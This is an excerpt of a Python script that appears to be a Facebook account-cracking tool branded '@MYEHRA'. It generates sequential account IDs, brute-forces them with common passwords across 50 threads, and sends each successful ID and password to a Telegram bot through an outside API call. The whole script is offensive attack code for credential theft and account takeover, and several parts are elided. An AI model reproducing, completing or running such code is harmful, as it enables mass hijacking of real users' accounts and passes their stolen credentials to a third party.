...
class MJEHRA:
    ...
    def main(self):
        self.banner()
        line()
        print(f'FACEBOOK TOOL @MYEHRA')
        line()
        print(f'\x1b[1;92m {XX}[\x1b[1;92m01{XX}] CRACK 2009')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m02{XX}] CRACK 2010')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m03{XX}] CRACK 2008')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m04{XX}] CRACK 2007')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m05{XX}] CRACK 2006')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m06{XX}] CRACK 2005')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m07{XX}] CRACK 2004')
        line()
    ...
    def oldClone(self,series):
        ...
        line();print(f'\033[1;30m EXAMPLE : {G}2000  {G}3000  ');line()
        ...
        with ThreadPoolExecutor(max_workers=50) as Mr_Code:
            ...
            print(f'\033[1;30m USE VPN 1111 WHEN YOU RUN ')
            ...
            for love in self.gen:
                ids = self.uX + love
                passlist = ["123456", "1234567", "12345678", "123456789", "1234567890"]
                Mr_Code.submit(self.CloneOld,ids,passlist)
        sys.exit("\n-------------------------------")
    
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r{XX}[{G} <  𝐄𝐇𝐑𝐀 {XX}]{G}  {self.loop}  {XX}[{G}OK{XX}]{G}  {len(self.oks)}")
        sys.stdout.flush()
        ...
        try:
            for pas in passlist:
                ...
                if "access_token" in response:
                    print(f"\r\r{XX}[{G}AMIR-OK{XX}]{G} ~ {ids} ~ {pas}")
                    tlg = f''' 𝐄𝐇𝐑𝐀 𝐆𝐎𝐓 𝐇𝐈𝐓 
◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧
𝗜𝗗 : {ids}
𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 : {pas}
◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧
 ༄𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑 : @MYEHRA''';requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
